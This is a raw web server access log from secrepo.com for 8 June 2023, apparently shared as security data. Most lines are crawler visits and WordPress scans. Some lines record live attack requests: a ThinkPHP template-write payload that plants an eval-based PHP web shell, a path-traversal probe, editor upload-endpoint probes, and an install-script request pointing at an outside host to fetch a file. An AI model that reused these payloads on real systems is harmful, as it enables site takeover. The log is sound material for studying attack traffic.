216.244.66.245 - - [08/Jun/2023:01:58:14 -0700] "GET /self.logs/error.log.2023-04-16.gz HTTP/1.1" 200 1082 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
103.246.218.47 - - [08/Jun/2023:03:21:02 -0700] "GET /ueditor_kejin/net/controller.ashx?action=catchimage HTTP/1.1" 301 576 "http://secrepo.com/ueditor_kejin/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.2; eu) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4" 
103.246.218.47 - - [08/Jun/2023:03:21:03 -0700] "GET /content/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 580 "http://secrepo.com/content/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13" 
103.246.218.47 - - [08/Jun/2023:03:21:03 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 301 536 "http://secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.454.0 Safari/534.2" 
103.246.218.47 - - [08/Jun/2023:03:21:03 -0700] "GET /wxapp.php HTTP/1.1" 301 492 "http://secrepo.com/wxapp.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.173.1 Safari/530.5" 
103.246.218.47 - - [08/Jun/2023:03:21:04 -0700] "POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1" 301 552 "http://secrepo.com/wxapp.php?controller=Goods.doPageUpload" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7" 
103.246.218.47 - - [08/Jun/2023:03:21:04 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 301 580 "http://secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16" 
103.246.218.47 - - [08/Jun/2023:03:21:04 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 301 544 "http://secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.162.0 Safari/530.0" 
103.246.218.47 - - [08/Jun/2023:03:21:05 -0700] "POST /tt.php HTTP/1.1" 301 486 "http://secrepo.com/tt.php" "Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53" 
103.246.218.47 - - [08/Jun/2023:03:21:05 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=illin.php&content=%3C?php%20class%20GaM10fA5%20%7B%20public%20function%20__construct($H7mu6)%7B%20@eval(%22/*ZG5zknRfSk*/%22.$H7mu6.%22%22);%20%7D%7Dnew%20GaM10fA5($_REQUEST%5B'pass'%5D);?%3E HTTP/1.1" 301 986 "http://secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=illin.php&content=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval(\"/*ZG5zknRfSk*/\".$H7mu6.\"\"); }}new GaM10fA5($_REQUEST['pass']);?>" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ca-es) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16" 
103.246.218.47 - - [08/Jun/2023:03:21:05 -0700] "POST /illin.php HTTP/1.1" 301 492 "http://secrepo.com/illin.php" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19" 
103.246.218.47 - - [08/Jun/2023:03:21:06 -0700] "POST /index.php?s=/home/page/uploadImg HTTP/1.1" 301 502 "http://secrepo.com/index.php?s=/home/page/uploadImg" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14" 
103.246.218.47 - - [08/Jun/2023:03:21:06 -0700] "POST /mobile/api/api.ali.php HTTP/1.1" 301 519 "http://secrepo.com/mobile/api/api.ali.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4" 
103.246.218.47 - - [08/Jun/2023:03:21:07 -0700] "GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/2210/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.wer HTTP/1.1" 301 690 "http://secrepo.com/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2210/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.wer" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.639.0 Safari/534.16" 
103.246.218.47 - - [08/Jun/2023:03:21:07 -0700] "POST /fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media HTTP/1.1" 301 600 "http://secrepo.com/fckeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Media" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20100101 Firefox/4.0b7" 
114.119.142.12 - - [08/Jun/2023:03:22:05 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1543 "http://www.secrepo.com/Datasets%20Description/Network/?C=D%3BO%3DA" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.134.48 - - [08/Jun/2023:03:22:25 -0700] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 200 1532 "http://www.secrepo.com/Datasets%20Description/Network/?C=D%3BO%3DA" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
123.125.109.108 - - [08/Jun/2023:03:22:36 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
27.115.124.33 - - [08/Jun/2023:03:27:57 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
27.115.124.33 - - [08/Jun/2023:03:27:57 -0700] "GET /css/style.css HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:13 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:14 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:34 -0700] "GET /ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js HTTP/1.1" 301 587 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:35 -0700] "GET /ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:35 -0700] "GET /netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js HTTP/1.1" 301 592 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:41 -0700] "GET /netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js HTTP/1.1" 301 593 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:41 -0700] "GET /www.google-analytics.com/analytics.js HTTP/1.1" 301 549 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:41 -0700] "GET /www.google-analytics.com/analytics.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:42 -0700] "GET /quantserve.com/quant.js HTTP/1.1" 301 520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
140.249.148.123 - - [08/Jun/2023:03:29:43 -0700] "GET /quantserve.com/quant.js HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:29 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:29 -0700] "GET / HTTP/1.1" 200 49133 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:29 -0700] "GET //wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:29 -0700] "GET //xmlrpc.php?rsd HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:29 -0700] "GET / HTTP/1.1" 200 49110 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:30 -0700] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:31 -0700] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:31 -0700] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:31 -0700] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:31 -0700] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:38:31 -0700] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 305 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
103.70.192.38 - - [08/Jun/2023:03:38:39 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
103.70.192.38 - - [08/Jun/2023:03:38:39 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:08 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:08 -0700] "GET / HTTP/1.1" 429 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:08 -0700] "GET //wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //xmlrpc.php?rsd HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET / HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //2020/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:09 -0700] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:10 -0700] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
20.169.37.16 - - [08/Jun/2023:03:48:10 -0700] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.1" 429 500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36" 
51.222.253.11 - - [08/Jun/2023:03:50:52 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
194.28.5.80 - - [08/Jun/2023:03:53:40 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:53:40 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:53:40 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:53:40 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:53:40 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:56:42 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:56:42 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:56:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:56:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
194.28.5.80 - - [08/Jun/2023:03:56:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1" 
118.114.56.102 - - [08/Jun/2023:04:02:05 -0700] "GET /favicon.ico HTTP/1.1" 304 261 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
193.42.40.154 - - [08/Jun/2023:04:02:12 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 284 "http://www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
193.42.40.154 - - [08/Jun/2023:04:02:12 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=hqtit.php&updateHost=http://url2023.top/ HTTP/1.1" 404 328 "http://www.secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=hqtit.php&updateHost=http://url2023.top/" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0" 
193.42.40.154 - - [08/Jun/2023:04:02:13 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://www.secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.23 Safari/530.5" 
193.42.40.154 - - [08/Jun/2023:04:02:13 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 250 "http://www.secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
193.42.40.154 - - [08/Jun/2023:04:02:13 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 305 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.171.0 Safari/530.4" 
